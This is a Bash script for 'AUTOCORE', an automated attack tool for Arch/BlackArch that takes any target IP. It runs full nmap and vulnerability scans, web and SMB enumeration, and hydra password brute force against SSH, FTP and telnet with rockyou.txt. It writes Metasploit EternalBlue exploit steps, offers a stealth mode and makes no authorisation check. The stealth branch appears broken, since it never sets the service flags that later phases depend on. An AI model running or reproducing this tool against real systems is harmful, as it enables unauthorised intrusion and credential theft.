#!/bin/bash
# ============================================================
#  Tool    : AUTOCORE
#  Author  : Ch Manan (OBLIQ_CORE)
#  Handle  : cynex
#  GitHub  : https://github.com/Abdul-Manan-C
#  Version : 1.0
#  Platform: Arch Linux / BlackArch / Manjaro
# ============================================================

RED='\033[0;31m'; CYAN='\033[0;36m'; GREEN='\033[0;32m'
YELLOW='\033[1;33m'; MAGENTA='\033[0;35m'; BLUE='\033[0;34m'
WHITE='\033[1;37m'; DIM='\033[2m'; RESET='\033[0m'; BOLD='\033[1m'

banner() {
echo -e "${RED}"
cat << 'EOF'
  ▄▄▄       █    ██ ▄▄▄█████▓ ▒█████   ▄████▄   ▒█████   ██▀███  ▓█████
 ▒████▄     ██  ▓██▒▓  ██▒ ▓▒▒██▒  ██▒▒██▀ ▀█  ▒██▒  ██▒▓██ ▒ ██▒▓█   ▀
 ▒██  ▀█▄  ▓██  ▒██░▒ ▓██░ ▒░▒██░  ██▒▒▓█    ▄ ▒██░  ██▒▓██ ░▄█ ▒▒███
 ░██▄▄▄▄██ ▓▓█  ░██░░ ▓██▓ ░ ▒██   ██░▒▓▓▄ ▄██▒▒██   ██░▒██▀▀█▄  ▒▓█  ▄
  ▓█   ▓██▒▒▒█████▓   ▒██▒ ░ ░ ████▓▒░▒ ▓███▀ ░░ ████▓▒░░██▓ ▒██▒░▒████▒
  ▒▒   ▓▒█░░▒▓▒ ▒ ▒   ▒ ░░   ░ ▒░▒░▒░ ░ ░▒ ▒  ░░ ▒░▒░▒░ ░ ▒▓ ░▒▓░░░ ▒░ ░
   ▒   ▒▒ ░░░▒░ ░ ░     ░      ░ ▒ ▒░   ░  ▒     ░ ▒ ▒░   ░▒ ░ ▒░ ░ ░  ░
   ░   ▒    ░░░ ░ ░   ░      ░ ░ ░ ▒  ░        ░ ░ ░ ▒    ░░   ░    ░
       ░  ░   ░                  ░ ░  ░ ░          ░ ░     ░        ░  ░
EOF
echo -e "${RESET}"
echo -e "${CYAN}${BOLD}         [ AUTOCORE v1.0 | Automated Pentest Orchestrator | Arch/BlackArch ]${RESET}"
echo -e "${DIM}         Author: Ch Manan (OBLIQ_CORE) | cynex | github.com/Abdul-Manan-C${RESET}\n"
}

section() {
    echo -e "\n${CYAN}╔══════════════════════════════════════════════════════╗${RESET}"
    echo -e "${CYAN}║${RESET}  ${WHITE}${BOLD}PHASE $1 — $2${RESET}"
    echo -e "${CYAN}╚══════════════════════════════════════════════════════╝${RESET}"
}
ok()   { echo -e "  ${GREEN}✔${RESET}  $1"; }
warn() { echo -e "  ${YELLOW}!${RESET}  $1"; }
run()  { echo -e "  ${MAGENTA}>>${RESET} $1"; }
save() { echo -e "  ${BLUE}💾${RESET} Saved: $1"; }
check_tool() { command -v "$1" &>/dev/null; }

WORDLIST_DIR="/usr/share/wordlists"
WORDLIST_DIRS="$WORDLIST_DIR/dirb/common.txt"
WORDLIST_PASS="$WORDLIST_DIR/rockyou.txt"
WORDLIST_USER="$WORDLIST_DIR/metasploit/unix_users.txt"

# Arch wordlist path may differ
[[ ! -f "$WORDLIST_DIRS" ]] && WORDLIST_DIRS="/usr/share/dirb/wordlists/common.txt"
[[ ! -f "$WORDLIST_DIRS" ]] && WORDLIST_DIRS="$HOME/wordlists/common.txt"
[[ ! -f "$WORDLIST_USER" ]] && WORDLIST_USER="$HOME/wordlists/unix_users.txt"

usage() {
    echo -e "${WHITE}Usage:${RESET}"
    echo -e "  autocore <IP>           — Full scan"; echo -e "  autocore <IP> --web     — Web only"
    echo -e "  autocore <IP> --smb     — SMB only"; echo -e "  autocore <IP> --brute   — Brute force"
    echo -e "  autocore <IP> --full    — All phases"; echo -e "  autocore <IP> --stealth — Stealth mode"
    exit 0
}

[[ $# -lt 1 ]] && banner && usage
TARGET="$1"; MODE="${2:---full}"
if [[ "$TARGET" == -* ]]; then
    banner
    usage
fi
banner

# ─── Install missing tools ────────────────────────────────
ensure_tools() {
    local PKG_MGR="pacman"
    command -v yay &>/dev/null && PKG_MGR="yay"
    command -v paru &>/dev/null && PKG_MGR="paru"

    for t in nmap hydra nikto whatweb gobuster curl wget enum4linux smbclient metasploit; do
        check_tool "$t" || {
            warn "Installing $t via $PKG_MGR..."
            sudo $PKG_MGR -S --noconfirm "$t"  || warn "Failed: $t"
        }
    done

    # Wordlists on Arch (blackarch-wordlists or manual)
    if [[ ! -f "$WORDLIST_DIRS" ]]; then
        mkdir -p "$HOME/wordlists"
        wget -q "https://raw.githubusercontent.com/v0re/dirb/master/wordlists/common.txt" -O "$HOME/wordlists/common.txt" 
        WORDLIST_DIRS="$HOME/wordlists/common.txt"; ok "Downloaded common.txt"
    fi
    if [[ ! -f "$WORDLIST_USER" ]]; then
        printf "root\nadmin\nuser\ntest\nguest\nftp\n" > "$HOME/wordlists/unix_users.txt"
        WORDLIST_USER="$HOME/wordlists/unix_users.txt"; ok "Created unix_users.txt"
    fi
}

TIMESTAMP=$(date +%Y%m%d_%H%M%S)
SESSION="autocore_${TARGET}_${TIMESTAMP}"
mkdir -p "$SESSION"/{nmap,web,nikto,smb,hydra,metasploit,whatweb,enum,loot}
ok "Session: $SESSION"
echo -e "  ${DIM}Mode: $MODE | Target: $TARGET | Platform: Arch/BlackArch${RESET}\n"
ensure_tools

OPEN_PORTS=""; HAS_WEB=false; HAS_SMB=false; HAS_SSH=false; HAS_FTP=false; HAS_TELNET=false

phase_recon() {
    section 1 "RECON"
    { echo "=== PING ===" && ping -c 3 "$TARGET" 
      echo -e "\n=== WHOIS ===" && check_tool whois && whois "$TARGET" 
      echo -e "\n=== HOST ===" && check_tool host && host "$TARGET" ; } | tee "$SESSION/enum/recon.txt"
    save "$SESSION/enum/recon.txt"
}

phase_nmap() {
    section 2 "NMAP"
    sudo nmap -Pn -sS -T4 --top-ports 1000 "$TARGET" -oN "$SESSION/nmap/nmap_1_quick.txt" ; save "$SESSION/nmap/nmap_1_quick.txt"
    sudo nmap -Pn -sS -T4 -p- "$TARGET" -oN "$SESSION/nmap/nmap_2_fullports.txt" ; save "$SESSION/nmap/nmap_2_fullports.txt"
    OPEN_PORTS=$(grep "^[0-9]" "$SESSION/nmap/nmap_2_fullports.txt"  | grep "open" | awk -F/ '{print $1}' | tr '\n' ',')
    ok "Open ports: $OPEN_PORTS"
    if [[ -n "$OPEN_PORTS" ]]; then
        sudo nmap -Pn -sS -sV -sC -p"${OPEN_PORTS}" "$TARGET" -oN "$SESSION/nmap/nmap_3_services.txt" ; save "$SESSION/nmap/nmap_3_services.txt"
        sudo nmap --script vuln -p"${OPEN_PORTS}" "$TARGET" -oN "$SESSION/nmap/nmap_4_vulns.txt" ; save "$SESSION/nmap/nmap_4_vulns.txt"
        sudo nmap -O "$TARGET" -oN "$SESSION/nmap/nmap_5_os.txt" ; save "$SESSION/nmap/nmap_5_os.txt"
    fi
    grep -q "80/open\|443/open\|8080/open" "$SESSION/nmap/nmap_2_fullports.txt"  && HAS_WEB=true
    grep -q "445/open\|139/open" "$SESSION/nmap/nmap_2_fullports.txt"  && HAS_SMB=true
    grep -q "22/open" "$SESSION/nmap/nmap_2_fullports.txt"  && HAS_SSH=true
    grep -q "21/open" "$SESSION/nmap/nmap_2_fullports.txt"  && HAS_FTP=true
    grep -q "23/open" "$SESSION/nmap/nmap_2_fullports.txt"  && HAS_TELNET=true
}

phase_web() {
    section 3 "WEB"
    [[ "$HAS_WEB" != true ]] && warn "No web — skipping" && return
    PROTO="http"; grep -q "443/open" "$SESSION/nmap/nmap_2_fullports.txt"  && PROTO="https"
    URL="${PROTO}://${TARGET}"
    check_tool whatweb && whatweb "$URL" | tee "$SESSION/whatweb/whatweb_1.txt" && save "$SESSION/whatweb/whatweb_1.txt"
    check_tool nikto && nikto -h "$URL" -o "$SESSION/nikto/nikto_1.txt"  && save "$SESSION/nikto/nikto_1.txt"
    [[ -f "$WORDLIST_DIRS" ]] && check_tool gobuster && {
        gobuster dir -u "$URL" -w "$WORDLIST_DIRS" -o "$SESSION/web/gobuster_1_dirs.txt"  && save "$SESSION/web/gobuster_1_dirs.txt"
        gobuster dir -u "$URL" -w "$WORDLIST_DIRS" -x php,txt,html -o "$SESSION/web/gobuster_2_files.txt"  && save "$SESSION/web/gobuster_2_files.txt"
    }
    curl -skI "$URL" | tee "$SESSION/web/headers_1.txt" && save "$SESSION/web/headers_1.txt"
    curl -sk "${URL}/robots.txt" | tee "$SESSION/web/robots_1.txt" && save "$SESSION/web/robots_1.txt"
    curl -sk "${URL}/sitemap.xml" | tee "$SESSION/web/sitemap_1.txt" && save "$SESSION/web/sitemap_1.txt"
}

phase_smb() {
    section 4 "SMB"
    [[ "$HAS_SMB" != true ]] && warn "No SMB — skipping" && return
    check_tool enum4linux && enum4linux -a "$TARGET" | tee "$SESSION/smb/enum4linux_1_full.txt" && save "$SESSION/smb/enum4linux_1_full.txt"
    check_tool smbclient && smbclient -L "//${TARGET}" -N  | tee "$SESSION/smb/smb_1_shares.txt" && save "$SESSION/smb/smb_1_shares.txt"
    sudo nmap -p 445,139 --script smb-vuln*,smb-enum* "$TARGET" -oN "$SESSION/smb/nmap_smb_scripts.txt"  && save "$SESSION/smb/nmap_smb_scripts.txt"
}

phase_brute() {
    section 5 "BRUTE FORCE"
    check_tool hydra || { warn "hydra missing"; return; }
    [[ -f "$WORDLIST_PASS" ]] || { warn "rockyou.txt missing"; return; }
    [[ "$HAS_SSH" == true ]] && hydra -L "$WORDLIST_USER" -P "$WORDLIST_PASS" "$TARGET" ssh -o "$SESSION/hydra/hydra_1_ssh.txt"  && save "$SESSION/hydra/hydra_1_ssh.txt"
    [[ "$HAS_FTP" == true ]] && hydra -L "$WORDLIST_USER" -P "$WORDLIST_PASS" "$TARGET" ftp -o "$SESSION/hydra/hydra_2_ftp.txt"  && save "$SESSION/hydra/hydra_2_ftp.txt"
    [[ "$HAS_TELNET" == true ]] && hydra -L "$WORDLIST_USER" -P "$WORDLIST_PASS" "$TARGET" telnet -o "$SESSION/hydra/hydra_3_telnet.txt"  && save "$SESSION/hydra/hydra_3_telnet.txt"
    printf "# HTTP Brute Template\n# hydra -L users.txt -P rockyou.txt $TARGET http-post-form \"/login:user=^USER^&pass=^PASS^:Invalid\"\n" > "$SESSION/hydra/hydra_4_http_template.txt"
    save "$SESSION/hydra/hydra_4_http_template.txt"
}

phase_msf() {
    section 6 "METASPLOIT NOTES"
    cat > "$SESSION/metasploit/metasploit_notes.txt" << EOF
# AUTOCORE Metasploit Notes — $TARGET (Arch)
# Install: sudo pacman -S metasploit OR yay -S metasploit
msfconsole
search eternalblue
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS $TARGET; set LHOST <your_ip>; run
EOF
    save "$SESSION/metasploit/metasploit_notes.txt"
}

phase_report() {
    section 7 "FINAL REPORT"
    REPORT_FILE="$SESSION/REPORT_${TARGET}.txt"
    LOOT_FILE="$SESSION/loot/loot_summary.txt"
    CREDS=$(grep -r "login:" "$SESSION/hydra/"  | grep -v template | head -10)
    VULNS=$(grep -i "VULNERABLE\|CVE" "$SESSION/nmap/nmap_4_vulns.txt"  | head -10)
    { echo "AUTOCORE REPORT | $TARGET | Arch | $(date)"
      echo "Ports: $OPEN_PORTS"; echo "Creds: ${CREDS:-None}"; echo "Vulns: ${VULNS:-None}"
      echo "Files:"; find "$SESSION" -type f | sort; } | tee "$REPORT_FILE" "$LOOT_FILE"
    echo -e "\n${GREEN}╔══════════════════════════════════════════════════════╗${RESET}"
    echo -e "${GREEN}║${RESET}  ${GREEN}✔${RESET}  ${WHITE}${BOLD}AUTOCORE COMPLETE${RESET}"
    echo -e "${GREEN}╠══════════════════════════════════════════════════════╣${RESET}"
    echo -e "${GREEN}║${RESET}  ${DIM}Session : $SESSION${RESET}"
    echo -e "${GREEN}║${RESET}  ${DIM}Report  : $REPORT_FILE${RESET}"
    echo -e "${GREEN}╚══════════════════════════════════════════════════════╝${RESET}"
}

case "$MODE" in
    --web)    phase_recon; phase_nmap; phase_web ;;
    --smb)    phase_recon; phase_nmap; phase_smb ;;
    --brute)  phase_recon; phase_nmap; phase_brute ;;
    --stealth)
        phase_recon
        OPEN_PORTS=$(sudo nmap -Pn -sS -T2 -p- "$TARGET" -oN "$SESSION/nmap/nmap_1_quick.txt"  | grep "open" | awk -F/ '{print $1}' | tr '\n' ',')
        phase_web; phase_smb; phase_brute; phase_msf; phase_report ;;
    *)        phase_recon; phase_nmap; phase_web; phase_smb; phase_brute; phase_msf; phase_report ;;
esac
